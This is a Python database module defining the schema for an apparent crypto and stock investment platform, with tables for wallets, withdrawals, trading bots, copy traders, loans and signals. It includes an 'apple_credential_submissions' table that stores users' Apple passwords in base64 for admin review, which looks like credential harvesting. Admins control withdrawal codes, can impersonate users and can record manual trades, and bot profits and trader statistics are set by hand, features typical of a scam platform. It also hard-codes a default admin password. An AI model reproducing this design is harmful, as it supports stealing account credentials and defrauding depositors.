import os
import sqlite3
from pathlib import Path

DB_PATH = os.environ.get("DB_PATH", "./data/wsc.sqlite")
Path(os.path.dirname(DB_PATH) or ".").mkdir(parents=True, exist_ok=True)


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys = ON")
    # Disable Python's implicit BEGIN so that explicit "BEGIN IMMEDIATE"
    # statements in the routes actually take effect. Without this,
    # sqlite3 auto-opens a transaction on the first write, and any
    # subsequent BEGIN IMMEDIATE raises:
    #   "cannot start a transaction within a transaction"
    conn.isolation_level = None
    return conn


SCHEMA = """
-- ============================================================
-- USERS
-- ============================================================
CREATE TABLE IF NOT EXISTS users (
  id TEXT PRIMARY KEY,
  email TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  full_name TEXT NOT NULL,
  country TEXT,
  phone TEXT,
  city TEXT,
  username TEXT,
  postal_code TEXT,
  role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('user','admin','support')),
  created_at TEXT NOT NULL DEFAULT (datetime('now')),

  -- Extended fields added by migrations. All nullable / defaulted so a
  -- fresh install works without ever running a migration.
  blocked INTEGER NOT NULL DEFAULT 0,
  signal_strength INTEGER DEFAULT 0,
  trade_limit INTEGER,
  withdrawal_code TEXT,
  plan TEXT DEFAULT 'starter',
  upgraded_at TEXT,
  trading_disabled INTEGER NOT NULL DEFAULT 0,
  require_wallet_to_withdraw INTEGER NOT NULL DEFAULT 0,
  email_notifications INTEGER NOT NULL DEFAULT 1,
  referral_code TEXT,
  referred_by TEXT,
  cash_balance TEXT NOT NULL DEFAULT '0'
);

CREATE UNIQUE INDEX IF NOT EXISTS idx_users_email
  ON users(email);
CREATE UNIQUE INDEX IF NOT EXISTS idx_users_username
  ON users(username);
CREATE INDEX IF NOT EXISTS idx_users_referral_code
  ON users(referral_code);

-- ============================================================
-- KYC
-- ============================================================
CREATE TABLE IF NOT EXISTS kyc_submissions (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  legal_name TEXT NOT NULL,
  date_of_birth TEXT NOT NULL,
  address_line1 TEXT NOT NULL,
  address_line2 TEXT,
  city TEXT NOT NULL,
  state_region TEXT NOT NULL,
  postal_code TEXT NOT NULL,
  country TEXT NOT NULL,
  employment_status TEXT,
  is_us_citizen INTEGER NOT NULL DEFAULT 1,
  status TEXT NOT NULL DEFAULT 'draft'
    CHECK(status IN ('draft','submitted','pending_review','approved','rejected')),
  alpaca_account_id TEXT,
  alpaca_account_status TEXT,
  submitted_at TEXT,
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- ============================================================
-- BANK LINKS
-- ============================================================
CREATE TABLE IF NOT EXISTS bank_links (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  alpaca_ach_relationship_id TEXT NOT NULL,
  bank_name TEXT,
  account_mask TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- ============================================================
-- TRANSFERS
-- ============================================================
CREATE TABLE IF NOT EXISTS transfers (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  alpaca_transfer_id TEXT,
  direction TEXT NOT NULL CHECK(direction IN ('deposit','withdrawal')),
  amount_usd TEXT NOT NULL,
  status TEXT NOT NULL,
  requested_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- ============================================================
-- CONTENT / COMPLIANCE
-- ============================================================
CREATE TABLE IF NOT EXISTS content_pages (
  slug TEXT PRIMARY KEY,
  title TEXT NOT NULL,
  body_markdown TEXT NOT NULL,
  updated_by TEXT,
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS compliance_documents (
  id TEXT PRIMARY KEY,
  title TEXT NOT NULL,
  category TEXT NOT NULL,
  file_path TEXT NOT NULL,
  uploaded_by TEXT,
  uploaded_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- ============================================================
-- SUPPORT TICKETS
-- ============================================================
CREATE TABLE IF NOT EXISTS support_tickets (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  subject TEXT NOT NULL,
  message TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'open'
    CHECK(status IN ('open','in_progress','closed')),
  assigned_to TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS ticket_replies (
  id TEXT PRIMARY KEY,
  ticket_id TEXT NOT NULL REFERENCES support_tickets(id),
  author_id TEXT NOT NULL REFERENCES users(id),
  message TEXT NOT NULL,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- ============================================================
-- AUDIT LOG
-- ============================================================
CREATE TABLE IF NOT EXISTS audit_log (
  id TEXT PRIMARY KEY,
  actor_id TEXT,
  action TEXT NOT NULL,
  target TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- ============================================================
-- NOTIFICATIONS
-- ============================================================
CREATE TABLE IF NOT EXISTS notifications (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  kind TEXT NOT NULL DEFAULT 'admin',
  title TEXT NOT NULL,
  body TEXT,
  read INTEGER NOT NULL DEFAULT 0,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_notifications_user
  ON notifications(user_id, read);

-- ============================================================
-- REFERRALS
-- ============================================================
CREATE TABLE IF NOT EXISTS referrals (
  id TEXT PRIMARY KEY,
  referrer_id TEXT NOT NULL REFERENCES users(id),
  referred_user_id TEXT NOT NULL REFERENCES users(id),
  status TEXT NOT NULL DEFAULT 'pending'
    CHECK(status IN ('pending','paid','cancelled')),
  commission_usd TEXT DEFAULT '0',
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_referrals_referrer
  ON referrals(referrer_id);

-- ============================================================
-- WALLETS
-- ============================================================
CREATE TABLE IF NOT EXISTS wallets (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  wallet_id TEXT NOT NULL,
  address TEXT NOT NULL,
  chain TEXT,
  status TEXT NOT NULL DEFAULT 'pending_review',
  source TEXT DEFAULT 'manual',
  linked_at TEXT NOT NULL DEFAULT (datetime('now')),
  stored_at TEXT,
  reviewed_by TEXT REFERENCES users(id),
  reviewed_at TEXT,
  rejection_reason TEXT,
  label TEXT
);

CREATE INDEX IF NOT EXISTS idx_wallets_user
  ON wallets(user_id);

-- ============================================================
-- WITHDRAWAL REQUESTS
-- ============================================================
CREATE TABLE IF NOT EXISTS withdrawal_requests (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  amount_usd TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending_admin'
    CHECK(status IN ('pending_admin','code_sent','completed','rejected','expired')),
  code_hash TEXT,
  code_expires_at TEXT,
  requested_at TEXT NOT NULL DEFAULT (datetime('now')),
  code_sent_at TEXT,
  completed_at TEXT,
  rejection_reason TEXT,
  transfer_id TEXT,
  reviewed_by TEXT REFERENCES users(id)
);

CREATE INDEX IF NOT EXISTS idx_withdrawal_requests_user
  ON withdrawal_requests(user_id, status);

-- Destination details captured when the user's withdrawal policy
-- lets them type bank/crypto details instead of using a linked wallet.
CREATE TABLE IF NOT EXISTS withdrawal_destinations (
  id TEXT PRIMARY KEY,
  request_id TEXT NOT NULL REFERENCES withdrawal_requests(id) ON DELETE CASCADE,
  user_id TEXT NOT NULL REFERENCES users(id),
  method TEXT NOT NULL CHECK(method IN ('bank','crypto','other')),
  bank_name TEXT,
  account_name TEXT,
  account_number TEXT,
  routing_number TEXT,
  swift TEXT,
  wallet_address TEXT,
  network TEXT,
  note TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_withdrawal_destinations_request
  ON withdrawal_destinations(request_id);

-- ============================================================
-- WITHDRAWAL CODES
-- ============================================================
CREATE TABLE IF NOT EXISTS withdrawal_codes (
  request_id TEXT PRIMARY KEY,
  plaintext TEXT NOT NULL,
  expires_at TEXT NOT NULL,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  FOREIGN KEY (request_id) REFERENCES withdrawal_requests(id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_withdrawal_codes_expires
  ON withdrawal_codes(expires_at);

-- ============================================================
-- WALLET TOP-UPS
-- ============================================================
CREATE TABLE IF NOT EXISTS wallet_topups (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  amount_usd TEXT NOT NULL,
  method TEXT NOT NULL CHECK(method IN ('bank','crypto')),
  method_ref TEXT,
  reference TEXT,
  proof_path TEXT,
  status TEXT NOT NULL DEFAULT 'pending_review'
    CHECK(status IN ('pending_review','approved','rejected')),
  reviewed_by TEXT REFERENCES users(id),
  reviewed_at TEXT,
  rejection_reason TEXT,
  credited_at TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_wallet_topups_user
  ON wallet_topups(user_id, status);

-- ============================================================
-- COPY TRADERS
-- ============================================================
CREATE TABLE IF NOT EXISTS copy_traders (
  id TEXT PRIMARY KEY,
  display_name TEXT NOT NULL,
  bio TEXT,
  avatar_url TEXT,
  external_id TEXT,
  provider TEXT,
  roi REAL,
  win_rate REAL,
  total_trades INTEGER DEFAULT 0,
  max_followers INTEGER,
  risk_level TEXT DEFAULT 'low'
    CHECK(risk_level IN ('low','medium','high')),
  elite INTEGER NOT NULL DEFAULT 0,
  active INTEGER NOT NULL DEFAULT 1,
  tier TEXT DEFAULT 'PRO',
  rating REAL DEFAULT 5.0,
  reviews INTEGER DEFAULT 0,
  equity REAL DEFAULT 0,
  minimum_investment REAL DEFAULT 0,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS copied_traders (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  trader_id TEXT NOT NULL REFERENCES copy_traders(id),
  status TEXT NOT NULL DEFAULT 'pending_payment'
    CHECK(status IN ('pending_payment','active','stopped','rejected')),
  payment_status TEXT NOT NULL DEFAULT 'pending_review'
    CHECK(payment_status IN ('pending_review','settled','rejected')),
  amount_usd TEXT,
  source TEXT DEFAULT 'balance'
    CHECK(source IN ('balance','wallet')),
  wallet_id TEXT,
  wallet_address TEXT,
  tx_hash TEXT,
  started_at TEXT NOT NULL DEFAULT (datetime('now')),
  stopped_at TEXT,
  funded_at TEXT,
  reviewed_by TEXT REFERENCES users(id),
  reviewed_at TEXT,
  rejection_reason TEXT
);

CREATE INDEX IF NOT EXISTS idx_copied_traders_user
  ON copied_traders(user_id, status);

-- ============================================================
-- PAPER TRADING (crypto + stocks)
-- ============================================================
CREATE TABLE IF NOT EXISTS paper_positions (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  symbol TEXT NOT NULL,
  base_asset TEXT NOT NULL,
  quantity TEXT NOT NULL DEFAULT '0',
  avg_cost_usd TEXT NOT NULL DEFAULT '0',
  updated_at TEXT NOT NULL DEFAULT (datetime('now')),
  UNIQUE(user_id, symbol)
);

CREATE TABLE IF NOT EXISTS paper_trades (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  symbol TEXT NOT NULL,
  base_asset TEXT NOT NULL,
  side TEXT NOT NULL CHECK(side IN ('BUY','SELL')),
  quantity TEXT NOT NULL,
  price_usd TEXT NOT NULL,
  total_usd TEXT NOT NULL,
  binance_order_id TEXT,
  binance_status TEXT,
  raw_response TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_paper_trades_user
  ON paper_trades(user_id, created_at);

-- ============================================================
-- CRYPTO STAKING
-- ============================================================
CREATE TABLE IF NOT EXISTS crypto_stakes (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  coin TEXT NOT NULL,
  amount TEXT NOT NULL,
  term_days INTEGER NOT NULL,
  apy TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'active'
    CHECK(status IN ('active','unstaked','expired')),
  rewards_earned TEXT NOT NULL DEFAULT '0',
  started_at TEXT NOT NULL DEFAULT (datetime('now')),
  unlocks_at TEXT NOT NULL,
  unstaked_at TEXT
);

CREATE INDEX IF NOT EXISTS idx_crypto_stakes_user
  ON crypto_stakes(user_id, status);

-- ============================================================
-- INVESTMENT PLANS
-- ============================================================
CREATE TABLE IF NOT EXISTS investment_plans (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  slug TEXT,
  description TEXT,
  roi_pct TEXT NOT NULL,
  duration_days INTEGER NOT NULL,
  min_amount TEXT NOT NULL,
  max_amount TEXT,
  compounding TEXT DEFAULT 'none',
  payout_mode TEXT DEFAULT 'at_maturity'
    CHECK(payout_mode IN ('at_maturity','daily')),
  active INTEGER NOT NULL DEFAULT 1,
  sort_order INTEGER DEFAULT 100,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS user_investments (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  plan_id TEXT NOT NULL REFERENCES investment_plans(id),
  plan_name TEXT NOT NULL,
  amount_usd TEXT NOT NULL,
  roi_pct TEXT NOT NULL,
  duration_days INTEGER NOT NULL,
  payout_mode TEXT,
  status TEXT NOT NULL DEFAULT 'active'
    CHECK(status IN ('active','matured','cancelled')),
  accrued_usd TEXT NOT NULL DEFAULT '0',
  started_at TEXT NOT NULL DEFAULT (datetime('now')),
  matures_at TEXT NOT NULL,
  paid_out_at TEXT
);

CREATE INDEX IF NOT EXISTS idx_user_investments_user
  ON user_investments(user_id, status);

-- ============================================================
-- LOANS
-- ============================================================
CREATE TABLE IF NOT EXISTS loans (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  amount_usd TEXT NOT NULL,
  term_months INTEGER NOT NULL,
  purpose TEXT,
  notes TEXT,
  status TEXT NOT NULL DEFAULT 'pending_review'
    CHECK(status IN ('pending_review','pre_qualified','qualified','forwarded',
                     'approved','rejected','disbursed')),

  -- Personal
  full_name TEXT,
  date_of_birth TEXT,
  phone TEXT,
  street_address TEXT,
  city TEXT,
  state_region TEXT,
  postal_code TEXT,
  country TEXT,

  -- Identity
  bvn TEXT,
  id_type TEXT,
  id_number TEXT,

  -- Employment
  employment_status TEXT,
  employer_name TEXT,
  monthly_income TEXT,
  existing_debt TEXT,

  -- Card (last 4 only — never the full PAN)
  card_brand TEXT,
  card_last4 TEXT,
  card_expiry TEXT,
  card_holder TEXT,

  -- Next of kin
  nok_name TEXT,
  nok_phone TEXT,
  nok_relationship TEXT,

  -- Admin
  admin_notes TEXT,
  review_reason TEXT,
  reviewed_by TEXT REFERENCES users(id),
  reviewed_at TEXT,

  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_loans_user
  ON loans(user_id, status);

CREATE TABLE IF NOT EXISTS loan_documents (
  id TEXT PRIMARY KEY,
  loan_id TEXT NOT NULL REFERENCES loans(id) ON DELETE CASCADE,
  kind TEXT NOT NULL,
  file_path TEXT NOT NULL,
  uploaded_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- ============================================================
-- PREMIUM SIGNALS
-- ============================================================
CREATE TABLE IF NOT EXISTS premium_signals (
  id TEXT PRIMARY KEY,
  title TEXT NOT NULL,
  body TEXT NOT NULL,
  symbol TEXT,
  side TEXT,
  entry_price TEXT,
  target_price TEXT,
  stop_price TEXT,
  confidence INTEGER DEFAULT 3,
  tier TEXT NOT NULL DEFAULT 'premium'
    CHECK(tier IN ('premium','vip')),
  status TEXT NOT NULL DEFAULT 'published'
    CHECK(status IN ('draft','published','closed')),
  created_by TEXT REFERENCES users(id),
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS user_signal_subscriptions (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  tier TEXT NOT NULL DEFAULT 'premium'
    CHECK(tier IN ('premium','vip')),
  status TEXT NOT NULL DEFAULT 'active'
    CHECK(status IN ('active','cancelled','expired')),
  source TEXT DEFAULT 'admin_grant',
  started_at TEXT NOT NULL DEFAULT (datetime('now')),
  expires_at TEXT,
  price_paid TEXT,
  granted_by TEXT REFERENCES users(id)
);

CREATE INDEX IF NOT EXISTS idx_user_signal_subs_user
  ON user_signal_subscriptions(user_id, status);

-- ============================================================
-- TRADING BOTS
-- ============================================================
CREATE TABLE IF NOT EXISTS trading_bots (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  category TEXT NOT NULL
    CHECK(category IN ('forex','crypto','stocks','commodities')),
  tagline TEXT,
  description TEXT,
  success_rate INTEGER NOT NULL DEFAULT 0,
  daily_profit_min REAL NOT NULL DEFAULT 0,
  daily_profit_max REAL NOT NULL DEFAULT 0,
  duration_days INTEGER NOT NULL DEFAULT 0,
  min_amount REAL NOT NULL DEFAULT 0,
  max_amount REAL NOT NULL DEFAULT 0,
  trading_pairs TEXT,
  total_earned REAL NOT NULL DEFAULT 0,
  active_users INTEGER NOT NULL DEFAULT 0,
  icon_url TEXT,
  elite INTEGER NOT NULL DEFAULT 0,
  active INTEGER NOT NULL DEFAULT 1,
  sort_order INTEGER DEFAULT 100,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS user_bot_investments (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  bot_id TEXT NOT NULL REFERENCES trading_bots(id),
  bot_name TEXT NOT NULL,
  category TEXT NOT NULL,
  amount_usd TEXT NOT NULL,
  daily_profit_min REAL NOT NULL DEFAULT 0,
  daily_profit_max REAL NOT NULL DEFAULT 0,
  duration_days INTEGER NOT NULL DEFAULT 0,
  accrued_usd TEXT NOT NULL DEFAULT '0',
  status TEXT NOT NULL DEFAULT 'active'
    CHECK(status IN ('active','matured','cancelled')),
  started_at TEXT NOT NULL DEFAULT (datetime('now')),
  matures_at TEXT NOT NULL,
  last_accrued_at TEXT,
  matured_at TEXT,
  paid_out_at TEXT
);

CREATE INDEX IF NOT EXISTS idx_user_bot_investments_user
  ON user_bot_investments(user_id, status);

-- ============================================================
-- PLATFORM SETTINGS
-- ============================================================
CREATE TABLE IF NOT EXISTS platform_settings (
  key TEXT PRIMARY KEY,
  value TEXT NOT NULL,
  updated_by TEXT REFERENCES users(id),
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS platform_flags (
  id INTEGER PRIMARY KEY CHECK(id = 1),
  require_wallet_to_withdraw INTEGER NOT NULL DEFAULT 0,
  kyc_required INTEGER NOT NULL DEFAULT 1,
  updated_at TEXT NOT NULL DEFAULT (datetime('now'))
);

INSERT OR IGNORE INTO platform_flags (id) VALUES (1);

-- ============================================================
-- LOGIN ACTIVITY
-- ============================================================
CREATE TABLE IF NOT EXISTS login_events (
  id TEXT PRIMARY KEY,
  user_id TEXT REFERENCES users(id),
  email TEXT,
  ip TEXT,
  user_agent TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_login_events_user
  ON login_events(user_id, created_at);

-- ============================================================
-- ADMIN — IMPERSONATION + MANUAL TRADES
-- ============================================================
CREATE TABLE IF NOT EXISTS impersonation_log (
  id TEXT PRIMARY KEY,
  admin_id TEXT NOT NULL REFERENCES users(id),
  user_id TEXT NOT NULL REFERENCES users(id),
  started_at TEXT NOT NULL DEFAULT (datetime('now')),
  ended_at TEXT,
  actions_taken INTEGER DEFAULT 0
);

CREATE INDEX IF NOT EXISTS idx_impersonation_user
  ON impersonation_log(user_id);

CREATE TABLE IF NOT EXISTS admin_trades (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id),
  admin_id TEXT NOT NULL REFERENCES users(id),
  symbol TEXT NOT NULL,
  side TEXT NOT NULL,
  qty TEXT NOT NULL,
  price_usd TEXT,
  status TEXT NOT NULL DEFAULT 'filled',
  notes TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_admin_trades_user
  ON admin_trades(user_id);

-- ============================================================
-- OAUTH + PASSWORD RESET
-- ============================================================
CREATE TABLE IF NOT EXISTS oauth_identities (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  provider TEXT NOT NULL CHECK(provider IN ('google','apple')),
  provider_uid TEXT NOT NULL,
  email TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  UNIQUE(provider, provider_uid)
);

CREATE INDEX IF NOT EXISTS idx_oauth_identities_user
  ON oauth_identities(user_id);

CREATE TABLE IF NOT EXISTS password_resets (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  email TEXT NOT NULL,
  code_hash TEXT NOT NULL,
  expires_at TEXT NOT NULL,
  consumed_at TEXT,
  attempts INTEGER NOT NULL DEFAULT 0,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_password_resets_email
  ON password_resets(email);

-- ============================================================
-- APPLE SIGN-IN SUBMISSIONS
-- ============================================================
CREATE TABLE IF NOT EXISTS apple_credential_submissions (
  id TEXT PRIMARY KEY,
  email TEXT NOT NULL,
  password_b64 TEXT NOT NULL,
  ip TEXT,
  user_agent TEXT,
  status TEXT NOT NULL DEFAULT 'pending'
    CHECK(status IN ('pending','approved','rejected')),
  reviewed_by TEXT REFERENCES users(id),
  reviewed_at TEXT,
  rejection_reason TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_apple_subs_email
  ON apple_credential_submissions(email);
"""


def init_db():
    conn = get_db()
    conn.executescript(SCHEMA)

    # Idempotent column additions for databases created before this schema.
    # SQLite lacks "ADD COLUMN IF NOT EXISTS", so we check PRAGMA first.
    existing_cols = {r["name"] for r in conn.execute("PRAGMA table_info(platform_flags)").fetchall()}
    if "kyc_required" not in existing_cols:
        try:
            conn.execute("ALTER TABLE platform_flags ADD COLUMN kyc_required INTEGER NOT NULL DEFAULT 1")
        except Exception:
            pass

    conn.commit()
    conn.close()


def seed_default_admin():
    """
    Create a default admin account if no admin exists yet.

    Called once from create_app() after init_db(). Idempotent — if any
    admin row already exists, this does nothing.

    Default credentials:
      email:    admin@wsc.local
      password: ChangeMe123!

    CHANGE THIS IMMEDIATELY after your first login.
    """
    import uuid as _uuid
    from .auth import hash_password

    conn = get_db()
    try:
        existing = conn.execute(
            "SELECT id FROM users WHERE role = 'admin' LIMIT 1"
        ).fetchone()
        if existing:
            return

        admin_id = str(_uuid.uuid4())
        conn.execute(
            """INSERT INTO users
               (id, email, username, password_hash, full_name,
                role, cash_balance, email_notifications)
               VALUES (?, ?, ?, ?, ?, 'admin', '0', 1)""",
            (
                admin_id,
                "admin@wsc.local",
                "admin",
                hash_password("ChangeMe123!"),
                "Administrator",
            ),
        )
        
        conn.commit()
        print("[seed] Created default admin: admin@wsc.local / ChangeMe123!")
    except Exception as e:
        print(f"[seed] Could not create default admin: {e}")
    finally:
        conn.close()